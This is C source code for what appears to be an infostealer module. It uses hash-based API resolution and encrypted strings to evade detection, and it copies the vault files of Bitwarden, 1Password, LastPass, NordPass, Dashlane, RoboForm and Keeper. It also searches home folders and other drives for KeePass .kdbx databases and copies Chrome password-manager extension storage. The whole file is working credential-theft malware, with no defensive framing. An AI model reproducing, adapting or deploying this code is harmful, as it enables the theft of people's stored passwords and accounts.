#include "passman.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>

#ifdef ENABLE_PM_BITWARDEN
#include <string.h>
#include <stdio.h>

#define PM_MAX_PATH 512
#define PM_MAX_SIZE (20 * 1024 * 1024) /* 20 MB */
#define PM_MAX_FILES 512

/* ── API function pointer types (kernel32.dll) ──────────────────── */

typedef HANDLE (WINAPI *pCreateFileA_pm)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *pReadFile_pm)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pWriteFile_pm)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pCloseHandle_pm)(HANDLE);
typedef BOOL   (WINAPI *pCreateDirectoryA_pm)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef DWORD  (WINAPI *pGetFileAttributesA_pm)(LPCSTR);
typedef HANDLE (WINAPI *pFindFirstFileA_pm)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindNextFileA_pm)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindClose_pm)(HANDLE);
typedef DWORD  (WINAPI *pGetFileSize_pm)(HANDLE, LPDWORD);
typedef HANDLE (WINAPI *pGetProcessHeap_pm)(void);
typedef LPVOID (WINAPI *pHeapAlloc_pm)(HANDLE, DWORD, SIZE_T);
typedef BOOL   (WINAPI *pHeapFree_pm)(HANDLE, DWORD, LPVOID);

/* ── Resolved API pointers ──────────────────────────────────────── */

static struct {
    pCreateFileA_pm        pCreateFile;
    pReadFile_pm           pReadFile;
    pWriteFile_pm          pWriteFile;
    pCloseHandle_pm        pCloseHandle;
    pCreateDirectoryA_pm   pMkDir;
    pGetFileAttributesA_pm pGetAttr;
    pFindFirstFileA_pm     pFF;
    pFindNextFileA_pm      pFN;
    pFindClose_pm          pFC;
    pGetFileSize_pm        pGetFileSize;
    pGetProcessHeap_pm     pGetHeap;
    pHeapAlloc_pm          pAlloc;
    pHeapFree_pm           pFree;
    int                    ready;
} pm_api;

static void *pm_resolve(void *mod, const char *name) {
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

static int pm_ensure_api(void) {
    if (pm_api.ready) return 1;

    char dll[32], fn[32];
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;

    enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn);
    pm_api.pCreateFile = (pCreateFileA_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_ReadFile, ENC_READFILE_LEN, fn);
    pm_api.pReadFile = (pReadFile_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_WriteFile, ENC_WRITEFILE_LEN, fn);
    pm_api.pWriteFile = (pWriteFile_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    pm_api.pCloseHandle = (pCloseHandle_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN, fn);
    pm_api.pMkDir = (pCreateDirectoryA_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
    pm_api.pGetAttr = (pGetFileAttributesA_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
    pm_api.pFF = (pFindFirstFileA_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
    pm_api.pFN = (pFindNextFileA_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
    pm_api.pFC = (pFindClose_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_GetFileSize, ENC_GETFILESIZE_LEN, fn);
    pm_api.pGetFileSize = (pGetFileSize_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_GetProcessHeap, ENC_GETPROCESSHEAP_LEN, fn);
    pm_api.pGetHeap = (pGetProcessHeap_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_HeapAlloc, ENC_HEAPALLOC_LEN, fn);
    pm_api.pAlloc = (pHeapAlloc_pm)pm_resolve(k32, fn);
    enc_decrypt(enc_HeapFree, ENC_HEAPFREE_LEN, fn);
    pm_api.pFree = (pHeapFree_pm)pm_resolve(k32, fn);

    if (!pm_api.pCreateFile || !pm_api.pReadFile || !pm_api.pWriteFile ||
        !pm_api.pCloseHandle || !pm_api.pMkDir || !pm_api.pGetAttr ||
        !pm_api.pFF || !pm_api.pFN || !pm_api.pFC ||
        !pm_api.pGetFileSize || !pm_api.pGetHeap || !pm_api.pAlloc ||
        !pm_api.pFree)
        return 0;

    pm_api.ready = 1;
    return 1;
}

/* ── Known password manager data paths ──────────────────────────── */

typedef struct {
    const char *name;
    const char *appdata_subdir;
    int use_roaming;
} PMEntry;

static const PMEntry pm_list[] = {
    { "Bitwarden",  "Bitwarden",                          1 },
    { "1Password",  "1Password\\data",                    0 },
    { "LastPass",   "LastPass",                           0 },
    { "NordPass",   "NordPass",                           0 },
    { "Dashlane",   "Dashlane",                           0 },
    { "RoboForm",   "RoboForm",                           0 },
    { "Keeper",     "Keeper",                             0 },
};

#define PM_COUNT (sizeof(pm_list) / sizeof(pm_list[0]))

/* ── Target file extensions ────────────────────────────────────── */

static const char *pm_exts[] = {
    "json", "kdbx", "1pux", "sqlite", "sqlite3",
    "csv", "xml", "dat",
    NULL
};

/* ── Bitwarden specific filenames ───────────────────────────────── */

static const char *bw_files[] = {
    "data.json",
    "data.json.lock",
    NULL
};

static int has_pm_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;
    dot++;
    for (int i = 0; pm_exts[i]; i++) {
        if (_stricmp(dot, pm_exts[i]) == 0)
            return 1;
    }
    return 0;
}

static int is_known_bw_file(const char *name) {
    for (int i = 0; bw_files[i]; i++) {
        if (_stricmp(name, bw_files[i]) == 0)
            return 1;
    }
    return 0;
}

/* ── Copy a single file ────────────────────────────────────────── */

static int copy_file(const char *src, const char *dst) {
    HANDLE hIn = pm_api.pCreateFile(src, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return -1;

    DWORD fileSize = pm_api.pGetFileSize(hIn, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0 || fileSize > PM_MAX_SIZE) {
        pm_api.pCloseHandle(hIn);
        return -1;
    }

    char *buf = (char *)pm_api.pAlloc(pm_api.pGetHeap(), 0, fileSize);
    if (!buf) {
        pm_api.pCloseHandle(hIn);
        return -1;
    }

    DWORD read = 0;
    BOOL ok = pm_api.pReadFile(hIn, buf, fileSize, &read, NULL);
    pm_api.pCloseHandle(hIn);
    if (!ok || read == 0) {
        pm_api.pFree(pm_api.pGetHeap(), 0, buf);
        return -1;
    }

    HANDLE hOut = pm_api.pCreateFile(dst, GENERIC_WRITE, 0,
                                     NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        pm_api.pFree(pm_api.pGetHeap(), 0, buf);
        return -1;
    }

    DWORD written = 0;
    ok = pm_api.pWriteFile(hOut, buf, read, &written, NULL);
    pm_api.pCloseHandle(hOut);
    pm_api.pFree(pm_api.pGetHeap(), 0, buf);
    return ok ? 0 : -1;
}

/* ── Copy all matching files in a directory ─────────────────────── */

static int copy_matching_files(const char *src_dir, const char *dst_dir,
                               size_t *count, int bw_mode) {
    char pattern[PM_MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", src_dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = pm_api.pFF(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (*count >= PM_MAX_FILES) break;

        if (bw_mode) {
            if (!is_known_bw_file(fd.cFileName)) continue;
        } else {
            if (!has_pm_ext(fd.cFileName)) continue;
        }

        DWORD hi = fd.nFileSizeHigh;
        DWORD lo = fd.nFileSizeLow;
        if (hi > 0 || lo > PM_MAX_SIZE) continue;

        char src_path[PM_MAX_PATH];
        snprintf(src_path, sizeof(src_path), "%s\\%s", src_dir, fd.cFileName);

        char dst_path[PM_MAX_PATH];
        snprintf(dst_path, sizeof(dst_path), "%s\\%s", dst_dir, fd.cFileName);

        if (copy_file(src_path, dst_path) == 0)
            (*count)++;

    } while (pm_api.pFN(hFind, &fd));

    pm_api.pFC(hFind);
    return 0;
}

/* ── Recursive scan for .kdbx files ─────────────────────────────── */

static void scan_kdbx_recursive(const char *dir, const char *output_dir,
                                size_t *count, int depth) {
    if (depth > 6 || *count >= PM_MAX_FILES) return;

    char pattern[PM_MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = pm_api.pFF(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (*count >= PM_MAX_FILES) break;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.cFileName[0] == '.') continue;
            if (_stricmp(fd.cFileName, "Windows") == 0) continue;
            if (_stricmp(fd.cFileName, "Program Files") == 0) continue;
            if (_stricmp(fd.cFileName, "Program Files (x86)") == 0) continue;
            if (_stricmp(fd.cFileName, "ProgramData") == 0) continue;

            char subdir[PM_MAX_PATH];
            snprintf(subdir, sizeof(subdir), "%s\\%s", dir, fd.cFileName);
            scan_kdbx_recursive(subdir, output_dir, count, depth + 1);
            continue;
        }

        const char *dot = strrchr(fd.cFileName, '.');
        if (dot && _stricmp(dot, ".kdbx") == 0) {
            DWORD hi = fd.nFileSizeHigh;
            DWORD lo = fd.nFileSizeLow;
            if (hi > 0 || lo > PM_MAX_SIZE) continue;

            char src_path[PM_MAX_PATH];
            snprintf(src_path, sizeof(src_path), "%s\\%s", dir, fd.cFileName);

            char dst_path[PM_MAX_PATH];
            snprintf(dst_path, sizeof(dst_path), "%s\\kdbx_%zu_%s",
                     output_dir, *count, fd.cFileName);

            if (copy_file(src_path, dst_path) == 0)
                (*count)++;
        }

    } while (pm_api.pFN(hFind, &fd));

    pm_api.pFC(hFind);
}

/* ── Collect from a known PM directory ──────────────────────────── */

static int collect_pm_dir(const char *pm_name, const char *src_dir,
                          const char *output_dir, size_t *count, int bw_mode) {
    DWORD attr = pm_api.pGetAttr(src_dir);
    if (attr == INVALID_FILE_ATTRIBUTES ||
        !(attr & FILE_ATTRIBUTE_DIRECTORY))
        return 0;

    char pm_out[PM_MAX_PATH];
    snprintf(pm_out, sizeof(pm_out), "%s\\%s", output_dir, pm_name);
    pm_api.pMkDir(pm_out, NULL);

    return copy_matching_files(src_dir, pm_out, count, bw_mode);
}

/* ── Main entry point ──────────────────────────────────────────── */

int passman_collect(const char *output_dir) {
    if (!output_dir) return -1;
    if (!pm_ensure_api()) return -1;

    pm_api.pMkDir(output_dir, NULL);

    const char *local = getenv("LOCALAPPDATA");
    const char *roaming = getenv("APPDATA");
    if (!local && !roaming) return -1;

    size_t count = 0;

    /* Collect from known password manager directories */
    for (size_t i = 0; i < PM_COUNT; i++) {
        const PMEntry *e = &pm_list[i];
        const char *base = e->use_roaming ? roaming : local;
        if (!base) continue;

        char src_dir[PM_MAX_PATH];
        snprintf(src_dir, sizeof(src_dir), "%s\\%s", base, e->appdata_subdir);

        int bw_mode = (i == 0);
        collect_pm_dir(e->name, src_dir, output_dir, &count, bw_mode);
    }

    /* Scan for KeePassXC .kdbx files across common locations */
    {
        char kdbx_out[PM_MAX_PATH];
        snprintf(kdbx_out, sizeof(kdbx_out), "%s\\KeePassXC", output_dir);
        pm_api.pMkDir(kdbx_out, NULL);

        const char *home = getenv("USERPROFILE");
        if (home) {
            scan_kdbx_recursive(home, kdbx_out, &count, 0);
        }

        if (local) {
            scan_kdbx_recursive(local, kdbx_out, &count, 0);
        }

        if (roaming) {
            char docs[PM_MAX_PATH];
            snprintf(docs, sizeof(docs), "%s\\..\\Documents", roaming);
            scan_kdbx_recursive(docs, kdbx_out, &count, 0);
        }

        const char *drives[] = { "D:\\", "E:\\", "F:\\" };
        for (int d = 0; d < 3; d++) {
            DWORD da = pm_api.pGetAttr(drives[d]);
            if (da != INVALID_FILE_ATTRIBUTES) {
                scan_kdbx_recursive(drives[d], kdbx_out, &count, 0);
            }
        }
    }

    /* Scan browser extension settings for PM extensions */
    if (local) {
        static const struct { const char *id; const char *name; } ext_ids[] = {
            { "nngceckbapebfimnlniiiaiaopbngkcc", "Bitwarden_ext" },
            { "fdjamakpfbbddfjaooikfcpapjohcfmg", "1Password_ext" },
            { "hdokiejnpimakedhajhdlcegeplioahd", "LastPass_ext" },
            { "fjohedfmdkclgkjgbmaadibebkbnagoo", "NordPass_ext" },
            { "fdjamakpfbbddfjaooikfcpapjohcfmg", "Dashlane_ext" },
            { "pnlccmojcmeohlpggmfnbbiapkmbliob", "RoboForm_ext" },
            { "oboonakemofpalcgghocfoadofidhfkk", "KeePassXC_ext" },
            { "bfogiafebfohielmfpndgfnnblcidlfn", "Keeper_ext" },
            { "aeblfdkhhhdcdjpifhhbdioieplbjndc", "1Password_ext2" },
        };

        for (int i = 0; i < (int)(sizeof(ext_ids) / sizeof(ext_ids[0])); i++) {
            char ext_dir[PM_MAX_PATH];
            snprintf(ext_dir, sizeof(ext_dir),
                     "%s\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\%s",
                     local, ext_ids[i].id);

            DWORD ea = pm_api.pGetAttr(ext_dir);
            if (ea == INVALID_FILE_ATTRIBUTES ||
                !(ea & FILE_ATTRIBUTE_DIRECTORY))
                continue;

            char ext_out[PM_MAX_PATH];
            snprintf(ext_out, sizeof(ext_out), "%s\\%s", output_dir, ext_ids[i].name);
            pm_api.pMkDir(ext_out, NULL);

            copy_matching_files(ext_dir, ext_out, &count, 0);
        }
    }

    return (int)count;
}

#endif /* ENABLE_PM_BITWARDEN */
